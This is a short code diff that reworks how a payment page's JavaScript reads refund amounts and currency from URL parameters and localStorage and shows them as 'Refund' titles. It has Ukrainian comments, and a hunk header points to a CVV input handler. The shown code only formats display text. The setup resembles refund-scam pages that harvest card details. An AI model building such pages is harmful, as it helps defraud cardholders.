@@ -335,12 +335,8 @@ document.getElementById('cvv-input').addEventListener('input', function(e) {
   let currency = params.get('currency');
   let totalRaw = params.get('total');
   let title = '';
-  if (price && currency) {
-    localStorage.setItem('event_price', price);
-    localStorage.setItem('event_currency', currency);
-    title = `Refund ${price} ${currency}`;
-  } else if (totalRaw) {
-    // Витягуємо число і валюту з total (наприклад, 58CHF)
+  // Якщо є total (наприклад, 54KSL)
+  if (totalRaw) {
     const match = totalRaw.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
     if (match) {
       price = match[1].replace(',', '.');
@@ -353,9 +349,17 @@ document.getElementById('cvv-input').addEventListener('input', function(e) {
       // Якщо тільки число
       const numMatch = totalRaw.match(/\d+[\.,]?\d*/);
       price = numMatch ? numMatch[0].replace(',', '.') : '';
-      currency = localStorage.getItem('event_currency') || 'EUR';
+      currency = params.get('currency') || localStorage.getItem('event_currency') || 'EUR';
       title = `Refund ${price} ${currency}`;
     }
+  } else if (price && currency) {
+    localStorage.setItem('event_price', price);
+    localStorage.setItem('event_currency', currency);
+    title = `Refund ${price} ${currency}`;
+  } else if (currency) {
+    // Якщо є тільки валюта
+    localStorage.setItem('event_currency', currency);
+    title = `Refund ${currency}`;
   } else if (localStorage.getItem('refund_total')) {
     // Якщо total вже зник з адреси, але є у localStorage
     const saved = localStorage.getItem('refund_total');
@@ -376,13 +380,16 @@ document.getElementById('cvv-input').addEventListener('input', function(e) {
     price = localStorage.getItem('event_price');
     currency = localStorage.getItem('event_currency');
     if (price && currency) title = `Refund ${price} ${currency}`;
+    else if (currency) title = `Refund ${currency}`;
   }
   if (title) {
     document.getElementById('payment-title').textContent = title;
   }
-  if (price && currency) {
-    document.querySelectorAll('.event-price').forEach(el => el.textContent = price + ' ' + currency);
-  }
+  // Price: ...
+  let priceText = '';
+  if (price && currency) priceText = price + ' ' + currency;
+  else if (currency) priceText = currency;
+  document.querySelectorAll('.event-price').forEach(el => el.textContent = priceText);
 })();
 </script>
     <script>
